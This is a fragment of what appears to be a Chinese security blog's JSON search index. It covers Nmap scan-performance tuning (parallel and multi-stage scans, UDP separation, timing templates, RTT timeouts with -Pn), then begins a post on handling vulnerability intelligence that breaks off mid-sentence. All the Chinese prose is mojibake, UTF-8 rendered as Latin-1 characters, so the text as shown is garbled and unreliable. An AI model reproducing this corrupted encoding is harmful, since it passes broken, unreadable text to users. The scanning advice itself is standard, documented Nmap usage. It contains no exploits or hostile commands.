DNSè§£æåŠŸèƒ½ â€‹ Nmapæä¾›DNSè§£æå’Œåå‘DNSè§£æåŠŸèƒ½ã€‚é€šå¸¸æ­£å‘DNSè§£æé€Ÿåº¦å¾ˆå¿«ï¼Œä½†åå‘DNSè§£æéœ€è¦è€—è´¹å¾ˆé•¿æ—¶é—´ï¼Œå°¤å…¶æ˜¯å¯¹å¤§é‡ç›®æ ‡è¿›è¡Œæ¢æµ‹æ—¶ï¼Œåå‘DNSè§£æè¿‡ç¨‹ä¼šèŠ±è´¹å¤§é‡æ—¶é—´ã€‚ æœåŠ¡ç‰ˆæœ¬æ¢æµ‹ â€‹ ç«¯å£æ‰«ææ˜¯Nmapçš„æ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒæ—¶Nmapè¿˜æä¾›å¯¹æ‰€å‘ç°çš„ç«¯å£è¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ¢æµ‹ã€‚åœ¨è¿™ä¸€ç¯èŠ‚éœ€è¦å‘é€å¤§é‡çš„æ•°æ®åŒ…æ¥ç¡®å®šæœåŠ¡ç‰ˆæœ¬ã€‚åœ¨è¿™ä¸ªé˜¶æ®µNmapä¼šä¸TCPç«¯å£å»ºç«‹è¿æ¥å¹¶ç›‘å¬è¯¥ç«¯å£æœåŠ¡çº¦5ç§’ï¼Œä»¥æœŸæœ›åœ¨ç›®æ ‡ç«¯å£æœåŠ¡çš„æ¬¢è¿æ ‡è¯­bannerä¸­è·å–ä¿¡æ¯ï¼Œå¹¶ä¸nmap-service-probesæ–‡ä»¶æŒ‡çº¹è¿›è¡ŒåŒ¹é…ï¼›ä½†è‹¥æœªèƒ½åŒ¹é…ï¼Œåˆ™éœ€è¦ä½¿ç”¨å…¶ä»–æ¢é’ˆå»è¯±å¯¼è·å–æŒ‡çº¹ã€‚ â€¦â€¦ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:1","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.2 æ–¹æ³•è®ºæŠ€å·§ ä¿æŒç‰ˆæœ¬æ›´æ–° é€‰æ‹©æœ‰åˆ©çš„ç½‘ç»œä½ç½® â€‹ æˆ‘çš„ç†è§£æœ‰ä¸¤ä¸ªæ–¹é¢ï¼Œä¸€æ˜¯é€‰ä¸€ä¸ªç½‘ç»œç¯å¢ƒå¥½çš„åœ°æ–¹ï¼Œå‡å°‘è¶…æ—¶é‡æ”¾ç­‰ç°è±¡ï¼› â€‹ ç¬¬äºŒä¸ªæ˜¯ä»é˜²ç«å¢™åé¢æ‰«ï¼Œèƒ½å¤Ÿä»å†…ç½‘æ‰«æå°±ä¸è¦ä»å…¬ç½‘æ‰«æï¼Œä¸­é—´å°‘ä¸€äº›è·¯ç”±é˜²ç«å¢™ç­‰ç½‘ç»œè®¾å¤‡ï¼Œè¿™æ ·æ•°æ®æ›´å…¨é¢ä¸”å‡†ç¡®ã€‚ â€‹ å½“ç„¶å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ²¡æœ‰é€‰æ‹©çš„ä½™åœ°ã€‚ å¤šé˜¶æ®µæ‰«æ â€‹ å¦‚æœè®¡åˆ’è¿›è¡Œå…¨é¢çš„å®‰å…¨å®¡æ ¸ï¼Œå¯¹å…¨ç«¯å£è¿›è¡Œæ‰«æï¼Œæˆ‘å¯èƒ½ä¼šè€ƒè™‘å…ˆå¯¹ç»™å®šèµ„äº§èŒƒå›´è¿›è¡Œä¸€æ¬¡å¿«é€Ÿçš„æ‰«æï¼Œå¦‚nmap -n -F \u003ctargets\u003eï¼›åŒæ—¶åå°è¿›è¡Œå¿½ç•¥ä¸»æœºå­˜æ´»çŠ¶æ€çš„å…¨ç«¯å£æ¢æµ‹ï¼Œå¦‚nmap -Pn -n \u003ctargets\u003e -p-ã€‚ å¹¶å‘è¿›è¡ŒNmapæ‰«æ â€‹ åœ¨åŒä¸€å°ä¸»æœºä¸Šè¿è¡Œå¤šä¸ªNmapè¿›ç¨‹ï¼Œå°†å¤§ä»»åŠ¡è¿›è¡Œåˆ†è§£ã€‚å®˜æ–¹è¯´äº”ä¸ªæˆ–åä¸ªéƒ½è¿˜å¥½ï¼Œå¯åŠ¨å¤ªå¤šå¹¶å‘ä»»åŠ¡å®¹æ˜“å¯¼è‡´èµ„æºç«äº‰ã€‚ â€‹ å¦ä¸€ç§å¹¶è¡Œæ–¹å¼æ˜¯åœ¨ä¸åŒä¸»æœºä¸Šè¿è¡Œã€‚ â€‹ ä¾‹å¦‚ï¼šéœ€è¦æ‰«ä¸€ä¸ªBæ®µï¼Œé‚£å°±æ˜¯256ä¸ªCæ®µï¼Œæˆ‘å¯èƒ½ä¼šè€ƒè™‘å°†ä»»åŠ¡åˆ†ä¸ºåœ¨æœ¬åœ°ç§»åŠ¨åŠå…¬çš„ç»ˆç«¯ä¸Šè¿è¡Œ1ä¸ªCæ®µï¼Œåœ¨è¿œç¨‹ä¸»æœºä¸Šè¿è¡Œ3ä¸ªCæ®µ+64ä¸ª*3+60ä¸ªï¼Œè¿™ä¹ˆ6ä¸ªä»»åŠ¡ã€‚ åˆ†ç¦»å’Œä¼˜åŒ–UDPæ‰«æ â€‹ Nmapè™½ç„¶æ”¯æŒ -sSUï¼Œä½†åœ¨æ³¨é‡æ€§èƒ½æ—¶ä¸å»ºè®®ç»“åˆä½¿ç”¨TCPå’ŒUDPæ‰«æã€‚å› ä¸ºUDPæ‰«æé€šå¸¸ä¼šå¾ˆæ…¢ã€‚æ‰€ä»¥å»ºè®®åˆ†å¼€è¿›è¡Œã€‚ â€‹ ç”±äºUDPç«¯å£æ‰«ææŠ€æœ¯çš„ç‰¹æ®Šæ€§ï¼Œopenå’Œfilteredçš„ç«¯å£éƒ½ä¸ä¼šå‘é€å“åº”åŒ…ï¼Œå› æ­¤éœ€è¦æ—¶é—´å»ç­‰å¾…ï¼›è€Œæ— å“åº”åŒ…çš„æƒ…å†µä¸ºäº†æ’é™¤å› ç½‘ç»œåŸå› å¯¼è‡´çš„ä¸¢åŒ…è¿˜éœ€è¦è¿›è¡Œé‡ä¼ ç¡®è®¤ã€‚è€Œå¯¹äºå…³é—­çš„ç«¯å£ï¼Œä¼šæ”¶åˆ°ICMPç«¯å£ä¸å¯è¾¾ï¼Œéƒ¨åˆ†ç³»ç»Ÿä¼šé™åˆ¶ ICMP æ¶ˆæ¯å‘é€é€Ÿç‡ã€‚å› æ­¤UDPæ‰«æä¼šå¾ˆæ…¢ã€‚ â€‹ å®˜æ–¹ä¹Ÿç»™å‡ºäº†ä¸€äº›æ”¹å–„UDPæ‰«ææ€§èƒ½çš„å»ºè®®ï¼Œæ•´ä½“ä¸Šä¸æœ¬ç« å…¶ä»–å†…å®¹æƒ³æ³•ç›¸åŒã€‚å¢åŠ ä¸»æœºå¹¶è¡Œæ•°ï¼ˆâ€“min-hostgroupï¼‰åŒæ—¶æ‰«æå¤šä¸ªä¸»æœºï¼›ä¼˜å…ˆæ‰«æå¸¸è§ç«¯å£-Fï¼›ç‰ˆæœ¬æ¢æµ‹æ—¶ï¼ŒæŒ‡å®š â€“version-intensity 0 ä»…å°è¯•æœ€æœ‰å¯èƒ½é’ˆå¯¹ç»™å®šç«¯å£å·æœ‰æ•ˆçš„æ¢é’ˆï¼›ä»é˜²ç«å¢™åæ‰«æï¼›â€“host-timeout æŒ‡å®šä¸»æœºè¶…æ—¶æ—¶é—´ï¼Œè·³è¿‡å“åº”ç¼“æ…¢çš„ä¸»æœºï¼›æœ€åä¸€æ¡ï¼Œä¿æŒå†·é™ï¼Œåšç‚¹åˆ«çš„ï¼Œä¸è¦ç›¯ç€è¿›åº¦æ¡ï¼Œçœ¼ä¸è§å¿ƒä¸çƒ¦ï¼ˆ/doge/ï¼‰ å¿½ç•¥éå…³é”®æµ‹è¯•ã€‚æ˜ç¡®æµ‹è¯•ç›®çš„ â€‹ é¦–å…ˆéœ€è¦æƒ³æ¸…æ¥šæˆ‘ä»¬çš„æµ‹è¯•ç›®çš„ï¼Œæ˜ç¡®æµ‹è¯•ç›®çš„åå¯¹ä»»åŠ¡è¿›è¡Œåˆ’åˆ†ï¼Œé€‰å–æ‰«æç­–ç•¥ï¼ŒæŒ‡å®šå‚æ•°é€‰é¡¹ã€‚ ä¾‹å¦‚ï¼š â€‹ å¦‚æœä½ åªéœ€æ¢æµ‹ç½‘ç»œå†…å­˜æ´»ä¸»æœºï¼Œå°±æ²¡å¿…è¦è¿›è¡Œç«¯å£æ‰«æï¼Œç”¨-snç¦ç”¨ç«¯å£æ‰«æï¼› â€‹ **é™åˆ¶æ‰«æçš„ç«¯å£æ•°ã€‚**å½“é‡åˆ°é€Ÿç‡é™åˆ¶å’Œæ— å“åº”æ—¶ï¼ŒNmapæ‰«æé€Ÿç‡ä¼šä¸‹é™ï¼Œç»å¤§æ•°ä¸»æœºåªä¼šå¼€å‘å‡ ç™¾ä¸ªç«¯å£ï¼Œå¦‚æœä»…æ‰«æ100ä¸ªç«¯å£è€Œä¸æ˜¯é»˜è®¤çš„1000ä¸ªç«¯å£ï¼Œåˆ™ç«¯å£æ‰«æçš„é€Ÿåº¦å¤§çº¦æ˜¯å…¶10å€ã€‚å…¨ç«¯å£æ‰«æçš„100%å‡†ç¡®ç‡ä¸â€“top-ports 3328 çš„99%å‡†ç¡®ç‡çš„å–èˆã€‚ â€‹ è·³è¿‡é«˜çº§æ‰«æç±»å‹ã€‚ -A é€‰é¡¹ä¼šåŒæ—¶å¼€å¯è„šæœ¬æ¢æµ‹ -sCï¼Œç‰ˆæœ¬æ¢æµ‹-sVï¼Œæ“ä½œç³»ç»Ÿæ¢æµ‹ -Oå’Œè·¯ç”±è·Ÿè¸ªâ€“tracerouteï¼Œç¡®å®šè¿™äº›åŠŸèƒ½æ˜¯å¦éƒ½éœ€è¦å¼€å¯ï¼›å½“é’ˆå¯¹å¤§è§„æ¨¡ç½‘ç»œè¿›è¡Œæ‰«ææ—¶ï¼Œè¿™äº›é«˜çº§åŠŸèƒ½ä¼šèŠ±è´¹å¾ˆé•¿çš„æ—¶é—´ï¼Œå»ºè®®è·³è¿‡-sC -sVï¼Œç„¶åæ ¹æ®éœ€è¦åœ¨å„ç«¯å£ä¸Šæ‰§è¡Œä»–ä»¬ã€‚è‡³äºæ“ä½œç³»ç»Ÿæ¢æµ‹å’Œè·¯ç”±è·Ÿè¸ªï¼Œç»å¤§éƒ¨åˆ†æ—¶å€™å¯èƒ½å¹¶ä¸åœ¨æ„ã€‚ä½œä¸ºä¸€ç§æŠ˜è¡·æ–¹æ³•ï¼Œæ‚¨å¯ä»¥æŒ‡å®šâ€“osscan-limit â€“max-os-tries 1ï¼Œæ¥å‘Šè¯‰Nmapä¸è¦é‡è¯•æ— æ³•åŒ¹é…çš„æ“ä½œç³»ç»Ÿï¼Œå¹¶å¯¹æ²¡æœ‰å¼€æ”¾è‡³å°‘ä¸€ä¸ªTCPç«¯å£å’Œä¸€ä¸ªå…³é—­çš„TCPç«¯å£çš„ä»»ä½•ä¸»æœºè·³è¿‡æ“ä½œç³»ç»Ÿæ£€æµ‹ã€‚ â€‹ **ä¸å¿…è¦æ—¶å…³é—­DNSè§£æã€‚**Nmapé»˜è®¤ä¼šä¸»æœºè¿›è¡Œåå‘DNSè§£æï¼Œå°¤å…¶æ˜¯ä½¿ç”¨-Pnå’Œ-Ræ—¶ï¼Œä¼šå¯¹æ‰€æœ‰ä¸»æœºæ‰§è¡Œæ­¤æ“ä½œï¼Œè¿™ä¼šèŠ±è´¹å¾ˆå¤šæ—¶é—´ã€‚å¯ä»¥ä½¿ç”¨ --dns-servers æŒ‡å®šDNSæœåŠ¡å™¨æ¥åŠ é€Ÿè¿™ä¸€è¿‡ç¨‹ã€‚ä¸è¿‡ï¼Œåœ¨ä¸å¿…è¦æ—¶ï¼Œå»ºè®®ä½¿ç”¨-nç¦ç”¨DNSè§£æã€‚å¯¹äºé’ˆå¯¹å¤§é‡ä¸»æœºçš„ç®€å•æ‰«æï¼ˆä¾‹å¦‚pingæ‰«æï¼‰ï¼Œçœç•¥DNSæœ‰æ—¶å¯ä»¥å°†æ‰«ææ—¶é—´å‡å°‘20ï¼…æˆ–æ›´å¤šã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:2","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.3 Nmapé€‰é¡¹æŠ€å·§ åŠ é€Ÿé€‰é¡¹æ§åˆ¶ã€‚ nmap -h ä¸­ TIMING AND PERFORMANCE éƒ¨åˆ†çš„é€‰é¡¹å¯ä»¥å¸®åˆ°å¾ˆå¤šã€‚ â€“min-hostgroup, â€“max-hostgroup å¯æŒ‡å®šæœ€å°å’Œæœ€å¤§ä¸»æœºç»„å¤§å°ï¼Œå½±å“å¹¶å‘æ‰«æä¸»æœºé€Ÿç‡ã€‚ â€“min-parallelism, â€“max-parallelism å¯æŒ‡å®šæœ€å°å’Œæœ€å¤§å¹¶å‘è¿è¡Œçš„æ¢é’ˆæ•°é‡ â€“min-rtt-timeout, â€“max-rtt-timeout, â€“initial-rtt-timeout å¯æŒ‡å®šæœ€å°ã€æœ€å¤§å’Œåˆå§‹åŒ–æ¢é’ˆè¶…æ—¶å€¼ï¼Œéœ€å†™ä¸Šå•ä½ï¼Œé€šå¸¸ä¸ºæ¯«ç§’msã€‚Nmap åœ¨æ¯æ¬¡æ¥æ”¶åˆ°æ¢é’ˆå“åº”æ—¶è®°å½•è€—æ—¶ï¼Œä¼°ç®—ç½‘ç»œæƒ…å†µå¹¶è¿›è¡Œè®¡ç®—å¾—å‡ºtimeoutæ•°å€¼ã€‚ â€“max-retries å…è®¸æ¢é’ˆé‡ä¼ çš„æœ€å¤§å€¼ â€“host-timeout æŒ‡å®šå•ä¸ªä¸»æœºæ‰«æçš„æœ€å¤§æ—¶é•¿ï¼Œå½“åˆ°è¾¾æœ€å¤§æ—¶é—´ï¼Œå°†æ”¾å¼ƒè¯¥ä¸»æœºã€‚ â€“scan-delay, â€“max-scan-delay æŒ‡å®šé’ˆå¯¹å•ä¸ªä¸»æœºæ¯ä¸ªæ¢é’ˆä¹‹é—´çš„æœ€å°å’Œæœ€å¤§å»¶è¿Ÿæ§åˆ¶ï¼› â€“min-rate, â€“max-rate æŒ‡å®šæ¯ç§’å‘é€çš„æ¢é’ˆæ•°æ®åŒ…æœ€å°å’Œæœ€å¤§é€Ÿç‡ï¼Œè¿™ä¸ªå€¼å…è®¸è¶…è¿‡Nmapçš„æ‹¥å¡æ§åˆ¶ç®—æ³•é™åˆ¶ã€‚ â€“defeat-rst-ratelimit æŒ‡å®šç›®æ ‡ä¸»æœºçš„RSTæ•°æ®åŒ…å“åº”ç‡ï¼Œè¿™ä¸ªä¸å¤ªäº†è§£ã€‚ ä¼˜åŒ–æ—¶é—´å‚æ•° -T Nmapæä¾›äº†ä¸€äº›æ—¶é—´æ¨¡æ¿-T0-5ï¼Œéšç€æ•°å­—å¢å¤§ï¼Œæ‰«æé€Ÿåº¦å°†åŠ å¿«ã€‚å¯ä»¥ä½¿ç”¨ nmap -T5 -d çš„å½¢å¼æŸ¥çœ‹æ—¶é—´æ¨¡æ¿çš„å‚æ•° ä¸åŒçº§åˆ«çš„å‚æ•°è§ä¸‹è¡¨ åç§° T0 (Paranoid) T1(Sneaky) T2(Polite) T3(Normal) T4(Aggressive) T5(Insane) min-rtt-timeout 100 100 100 100 100 50 max-rtt-timeout 300,000 15,000 10,000 10,000 1,250 300 initial-rtt-timeout 300,000 15,000 1,000 1,000 500 250 max-retries 10 10 10 10 6 2 åˆå§‹åŒ–æ‰«æå»¶è¿Ÿ scan-delay 300,000 15,000 400 0 0 0 æœ€å¤§TCPæ‰«æå»¶è¿Ÿ 300,000 15,000 1,000 1,000 10 5 æœ€å¤§UDPæ‰«æå»¶è¿Ÿ 300,000 15,000 1,000 1,000 1,000 1,000 host-timeout 0 0 0 0 0 900,000 min-parallelism åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ max-parallelism 1 1 1 åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ min-hostgroup åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ max-hostgroup åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ åŠ¨æ€ min-rate æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ max-rate æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ æ— é™åˆ¶ defeat-rst-ratelimit é»˜è®¤æœªå¯ç”¨ é»˜è®¤æœªå¯ç”¨ é»˜è®¤æœªå¯ç”¨ é»˜è®¤æœªå¯ç”¨ é»˜è®¤æœªå¯ç”¨ é»˜è®¤æœªå¯ç”¨ æ³¨æ„ï¼šåŠ¨æ€çš„ï¼Œä¸å—æ—¶é—´æ¨¡æ¿é™åˆ¶ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:3","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"5.4 -Pn åŠ é€Ÿ â€‹ ä¹‹å‰æœ‰ä¸€ä¸ªç–‘é—®å°±æ˜¯ -Pn è·³è¿‡ä¸»æœºå‘ç°é˜¶æ®µï¼Œæ˜¯å¦èƒ½ç¼©çŸ­æ‰«ææ—¶é—´ï¼Ÿ â€‹ ç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œå› ä¸ºä¸»æœºå‘ç°é˜¶æ®µæ‰€è¿›è¡Œçš„ä¸å…‰æ˜¯æ¢æµ‹ä¸»æœºæ˜¯å¦å­˜æ´»ï¼ŒåŒæ—¶ä¹Ÿè®°å½•äº†ä¸ç›®æ ‡ä¸»æœºä¹‹é—´çš„ç½‘ç»œæƒ…å†µï¼Œç»™å‡ºä¸€ä¸ªRTTè¯„ä¼°å¹¶è°ƒæ•´è¶…æ—¶é‡ä¼ ç­‰å¾…æœºåˆ¶ï¼Œæ¥æé«˜æ¥ä¸‹å»çš„ç«¯å£æ‰«æé€Ÿåº¦ã€‚ â€‹ ä¸è¿‡æˆ‘ä»¬å¯ä»¥é€šè¿‡Nmapçš„ä¸€äº›é€‰é¡¹æ¥æ‰‹åŠ¨æŒ‡å®šè¿™äº›å‚æ•°ï¼Œæ¥åŠ å¿«æ‰«æé€Ÿåº¦ã€‚ â€‹ -Pn æœ€å¤§çš„é—®é¢˜å°±æ˜¯æ— æ³•è·å–åˆ°ç½‘ç»œçŠ¶æ€ä¿¡æ¯ï¼Œç”±äºé‡ä¼ å’ŒRTTä¼°ç®—çš„é—®é¢˜ï¼Œå¯¼è‡´æ•´ä¸ªæ‰«æè¿‡ç¨‹ç­‰å¾…æ—¶é—´è¿‡é•¿ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æŒ‡å®šâ€“max-rtt-timeout, â€“initial-rtt-timeoutã€‚ â€‹ Nmapæ²¡æœ‰ä»æ¯ä¸ªä¸»æœºä¸Šæ”¶é›†åˆ°è¶³å¤Ÿçš„å“åº”æ¥å‡†ç¡®ä¼°ç®—å»¶è¿Ÿå’Œä¸¢åŒ…ç‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆéœ€è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥æ‰‹åŠ¨æ”¶é›†è¯¥ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ping ç›¸é‚»çš„åœ¨çº¿ä¸»æœºè·å–å»¶è¿Ÿä¼°è®¡ï¼Œå½“ç„¶å¯èƒ½ä¼šæœ‰ç¦pingçš„ç°è±¡ï¼Œå¯ä»¥ç”¨nmapé™„èµ çš„å°å·¥å…·nping å¯¹å¼€æ”¾çš„ç«¯å£è¿›è¡Œæ¢æµ‹ï¼Œè·å–å»¶è¿Ÿä¼°è®¡ã€‚ â€‹ æ ¹æ®è¿™ä¸ªå»¶è¿Ÿï¼Œæˆ‘ä»¬å¤§è‡´èƒ½çŸ¥é“åˆ°è¯¥ç›®æ ‡èŒƒå›´ä¸»æœºçš„ç½‘ç»œçŠ¶å†µï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ‰‹åŠ¨æŒ‡å®šâ€“max-rtt-timeout, â€“initial-rtt-timeout ä¸ºæ¯”è¿™ä¸ªå»¶è¿Ÿå¤§ä¸€å®šç¨‹åº¦çš„å€¼å°±å¯ä»¥äº†ã€‚ä¾‹å¦‚å»¶è¿Ÿä¸º60æ¯«ç§’ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥å°†å…¶æŒ‡å®šä¸º â€“max-rtt-timeout 200ms â€“initial-rtt-timeout 150msã€‚ â€‹ ä¸€ä¸ªå®Œæ•´çš„æ¡ˆä¾‹ï¼Œè§ ã€ŠNNSã€‹ç¬¬å››ç« ï¼šç«¯å£æ‰«ææ¦‚è¿°â€”â€”æ¡ˆä¾‹ï¼šæ‰«æå¤§å‹ç½‘ç»œä»¥æŸ¥æ‰¾æŸä¸ªå¼€æ”¾çš„TCPç«¯å£ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:6:4","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["Tools"],"content":"0x06 æ€»ç»“ â€‹ æœ¬æ–‡ç®—æ˜¯åŸºäºã€ŠNmap Network Scanningã€‹çš„è¯»åæ„Ÿå§ï¼Œå…¨ä¹¦å†…å®¹å¾ˆå¤šä¹Ÿå­¦åˆ°äº†å¾ˆå¤šï¼ŒåŒæ—¶ä¹Ÿå¯¹è‡ªå·±çš„ç›¸å…³çŸ¥è¯†è¿›è¡Œäº†ä¸€ä¸ªæ•´ç†ã€‚ â€‹ è¿™é‡Œè¿˜æœªæ¶‰åŠåˆ°NSEè„šæœ¬å¼•æ“ï¼Œé‚£æ˜¯ä¸€ä¸ªå®è—ï¼Œå…·æœ‰å¾ˆå¥½çš„æ‰©å±•æ€§ï¼Œå¯ä»¥åŸºäºNSEè„šæœ¬å¼•æ“ï¼Œå¼€å‘å®šåˆ¶åŒ–è‡ªå·±çš„è„šæœ¬ä»¥å®ç°ç›¸åº”çš„åŠŸèƒ½ã€‚ç½‘ç»œä¸Šä¹Ÿæœ‰å¾ˆå¤šç›¸å…³çš„æ–‡ç« å¯ä»¥å­¦ä¹ å‚è€ƒã€‚ â€‹ è¿˜æœ‰ä¸€éƒ¨åˆ†å†…å®¹æ˜¯å…³äºé˜²ç«å¢™å’ŒIDSçš„å¯¹æŠ—æŠ€å·§ï¼Œè¿™éƒ¨åˆ†ç”±äºå®è·µæ£€éªŒçš„æ¯”è¾ƒå°‘ï¼Œæ²¡ä»€ä¹ˆå‘è¨€æƒï¼Œå°±ä¸è¯´äº†ã€‚ â€‹ æœ€åï¼Œæ„Ÿè§‰å¤§å®¶çš„é˜…è¯»ï¼Œå¦‚æœè§‰å¾—æœ¬æ–‡å†™çš„è¿˜å¯ä»¥ï¼Œå¯¹æ‚¨æœ‰å¸®åŠ©ï¼Œéº»çƒ¦æ‚¨ç‚¹ä¸ªèµï¼›å¦‚æœæ‚¨æœ‰ä»»ä½•çš„æ‰¹è¯„ã€æ„è§å’Œå»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€ã€‚ ","date":"2021-06-21","objectID":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/:7:0","tags":["Tools","Pentest"],"title":"002-Nmapè¿›é˜¶å­¦ä¹ å¿ƒå¾—","uri":"/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"},{"categories":["éšç¬”"],"content":"2021å¹´4æœˆ13æ—¥ å­¦ä¹ éšç¬”ï¼šæœ¬æ–‡ä»ä¸€ç¯‡æ–‡ç« å‡ºå‘ï¼Œæ€»ç»“ä¸€äº›å®‰å…¨å­¦ä¹ ç ”ç©¶çš„æƒ³æ³•ã€‚","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/","tags":["éšç¬”"],"title":"001-2021å¹´4æœˆ13æ—¥ å­¦ä¹ éšç¬”","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["éšç¬”"],"content":"æœ¬æ–‡ä»ä¸€ç¯‡æ–‡ç« å‡ºå‘ï¼Œæ€»ç»“ä¸€äº›å®‰å…¨å­¦ä¹ ç ”ç©¶çš„æƒ³æ³•ã€‚ ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:0:0","tags":["éšç¬”"],"title":"001-2021å¹´4æœˆ13æ—¥ å­¦ä¹ éšç¬”","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["éšç¬”"],"content":"0x00 èƒŒæ™¯ æœ€è¿‘æ¼”ä¹ æœŸé—´ï¼Œç²¾ç¥ç´§å¼ ï¼Œå¿™é‡Œå·é—²çœ‹çœ‹å¤§ä½¬ä»¬çš„å†å²åšå®¢ï¼Œå­¦ä¹ ä¸€äº›ä¸œè¥¿ã€‚ ä»Šå¤©å°±çœ‹äº†Pç‰›çš„ã€Šå®å¡”é¢æ¿phpMyAdminæœªæˆæƒè®¿é—®æ¼æ´æ˜¯ä¸ªä½çº§é”™è¯¯å—ï¼Ÿã€‹ï¼Œä¹Ÿä¸æ˜¯ä¸ºäº†æ¼æ´å¤ç°åˆ†æä»€ä¹ˆçš„ï¼Œå°±æ˜¯ä»è¿™ç¯‡æ–‡ç« ä¸­å­¦åˆ°çš„å­¦ä¹ æ–¹æ³•ã€‚ ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:1:0","tags":["éšç¬”"],"title":"001-2021å¹´4æœˆ13æ—¥ å­¦ä¹ éšç¬”","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"},{"categories":["éšç¬”"],"content":"0x01 ä¸€äº›æƒ³æ³• å½“æˆ‘ä»¬æ”¶åˆ°ä¸€ä¸ªæ¼æ´æƒ…æŠ¥æ—¶ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿæˆ‘è§‰å¾—å¯ä»¥è¿™ä¹ˆå‡ ä¸ªè§’åº¦æ¥åšï¼š æ”¶é›†æ•´ç†æ¼æ´æƒ…æŠ¥åŸºæœ¬ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ¼æ´å½±å“èŒƒå›´ã€æ¼æ´ç±»å‹ã€æ¼æ´ç­‰çº§ã€æ¼æ´åˆ©ç”¨æ¡ä»¶ã€ç¼“è§£æªæ–½å’Œä¿®å¤å»ºè®®ï¼›åŸºæœ¬ä¸Šæ”¶é›†æ•´ç†å®Œè¿™äº›ä¿¡æ¯ï¼Œå¯ä»¥ä¸‹å‘ç»™å„å•ä½è¿›è¡Œè‡ªæŸ¥å’Œé˜²æŠ¤ï¼Œç®—æ˜¯ä¸€æ¡æ¯”è¾ƒè¯¦ç»†çš„å¨èƒæƒ…æŠ¥äº† æ¼æ´ç‚¹ä½ç½®ï¼Œæœ‰æ— poc/expå…¬å¼€ å¦‚æœæ— poc/expå…¬å¸ƒï¼Œä½†æ˜¯æœ‰è¡¥ä¸æ–‡ä»¶å…¬å¸ƒï¼Œå¯ä»¥å¯¹æ¯”æ‰“è¡¥ä¸å‰å’Œè¡¥ä¸åçš„ä»£ç ï¼Œæ‰¾åˆ°æ¼æ´ç‚¹ä½ç½® æ¼æ´åˆ†æï¼Œæ¼æ´å½¢æˆçš„åŸå› ã€‚ å¯¹äºç¬¬ä¸‰ç‚¹æ¼æ´åˆ†ææ¥è¯´ï¼Œé€šå¸¸åªä¼šçœ‹ä¸‹æ¼æ´ç‚¹ä½ç½®çš„ä»£ç 